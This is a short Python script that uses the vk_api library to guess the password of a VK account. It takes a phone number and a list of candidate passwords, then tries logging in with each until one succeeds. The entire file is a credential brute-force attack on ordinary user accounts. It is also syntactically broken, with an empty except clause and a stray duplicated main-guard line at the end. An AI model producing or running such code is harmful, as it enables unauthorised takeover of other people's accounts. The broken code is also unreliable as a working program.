import vk_api

if __name__ == '__main__':
    phone = input('phone : ')
    words = list(map(str, input("words : ").split(', ')))
    for password in words:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print("FAUND: " + str(password))
            break
        except:
if __name__ == '__main__'
